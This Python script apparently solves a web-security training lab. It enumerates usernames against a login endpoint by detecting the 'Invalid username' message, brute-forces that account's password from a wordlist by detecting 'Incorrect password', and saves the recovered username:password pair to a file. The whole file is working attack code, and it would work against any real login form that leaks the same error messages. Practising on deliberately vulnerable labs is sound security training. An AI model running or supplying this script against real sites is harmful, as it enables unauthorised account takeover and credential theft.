import requests

url = "https://aca41ffe1e463587c02ed38a000b0019.web-security-academy.net/login"

status_code = requests.get(url=url).status_code
if status_code != 200:
    print(f'Status code: {status_code}')
    exit(status_code)

username = None
password = None

for uname in open('username.txt').readlines():
    uname = uname[:-1]
    data = {
        'username': uname,
        'password': 'a'
    }
    print(uname)
    res = requests.post(url=url, data=data).content
    with open('res.html', 'wb') as file:
        file.write(res)

    if b'Invalid username' not in res:
        username = uname
        break

if username is None:
    print("No username")
    exit(1)

for pwd in open('password.txt').readlines():
    pwd = pwd[:-1]
    data = {
        'username': username,
        'password': pwd
    }
    print(data)
    res = requests.post(url=url, data=data).content
    with open('res.html', 'wb') as file:
        file.write(res)

    if b'Incorrect password' not in res:
        password = pwd
        break

if password is None:
    print("No password")
    exit(1)

print(f"{username}:{password}")
with open("credential.txt", 'w') as file:
    file.write(f"{username}:{password}")
